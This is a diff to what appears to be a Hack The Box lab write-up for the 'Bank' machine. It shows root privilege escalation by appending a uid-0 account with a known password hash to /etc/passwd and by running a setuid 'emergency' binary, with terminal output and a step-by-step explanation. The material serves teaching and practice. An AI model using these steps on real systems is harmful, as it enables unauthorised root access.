@@ -804,17 +804,23 @@ www-data@bank:/var/www/bank/uploads$ openssl passwd -1 P@ssword1!
 openssl passwd -1 P@ssword1!
 $1$pwkb5t.S$NoHDeEhSIZke0vni9akQK0
 
+-------------------------------------------------------------------------------
+
 # append your own user to /etc/passwd as root 
-echo 'tyla:$1$pwkb5t.S$NoHDeEhSIZke0vni9akQK0:0:0:gotcha:/root:/bin/bash' >> /etc/passwd 
+$ echo 'tyla:$1$pwkb5t.S$NoHDeEhSIZke0vni9akQK0:0:0:gotcha:/root:/bin/bash' >> /etc/passwd 
+
+-------------------------------------------------------------------------------
 
 # verify the entry in /etc/passwd file 
 # it will be the last entry as below
 www-data@bank:/var/www/bank/uploads$ cat /etc/passwd                
-cat /etc/passwd                                                         ...      
+cat /etc/passwd                                                             
 tyla:$1$pwkb5t.S$NoHDeEhSIZke0vni9akQK0:0:0:gotcha:/root:/bin/bash
 
+-------------------------------------------------------------------------------
+
 # now ssh as that user and you are the root
-ssh tyla@bank.htb          
+$ ssh tyla@bank.htb          
 The authenticity of host 'bank.htb (10.10.10.29)' can't be established.
 ED25519 key fingerprint is SHA256:7S4JgORJLloHIy/gCCkxvRpbrpWXAlMs8QK2jFtpn/w.
 This key is not known by any other names.
@@ -833,6 +839,7 @@ Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-79-generic i686)
 Your Hardware Enablement Stack (HWE) is supported until April 2019.
 Last login: Fri Jun 16 07:44:56 2017
 root@bank:~# 
+
 ```
 
 This sequence of commands demonstrates a method for achieving privilege escalation by adding a new user to the `/etc/passwd` file and then accessing the system as the newly created user. Let's break down the steps:
@@ -860,6 +867,8 @@ file /var/htb/bin/emergency
 file /var/htb/bin/emergency
 /var/htb/bin/emergency: setuid ELF 32-bit LSB  shared object, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=1fff1896e5f8db5be4db7b7ebab6ee176129b399, stripped
 
+-------------------------------------------------------------------------------
+
 # now simply execute the binary and see what happens
 # you are the root
 /var/htb/bin/emergency 
@@ -868,4 +877,19 @@ id
 uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
 whoami
 root
+
 ```
+
+The commands demonstrate the analysis and execution of a binary file named "emergency," leading to privilege escalation to root. Here's a breakdown:
+
+1. **Checking File Type**:
+   - The `file` command is used to determine the type of the binary file located at `/var/htb/bin/emergency`.
+   - The output indicates that it is a setuid ELF 32-bit LSB (Linux Standard Base) shared object file, designed for the Intel 80386 architecture, and dynamically linked.
+
+2. **Executing the Binary**:
+   - The binary file `/var/htb/bin/emergency` is executed directly.
+   - After execution, the user's identity is checked using the `id` and `whoami` commands.
+   - The output shows that the user's effective user ID (euid) has been escalated to 0 (root), granting full root privileges.
+   - Both `id` and `whoami` commands confirm that the current user is now "root."
+
+The successful execution of the "emergency" binary results in a privilege escalation, allowing the user "www-data" to gain root access. This indicates a critical security vulnerability, possibly due to misconfigured permissions or a flaw in the binary itself, which can be exploited by attackers to gain unauthorised access and control over the system.
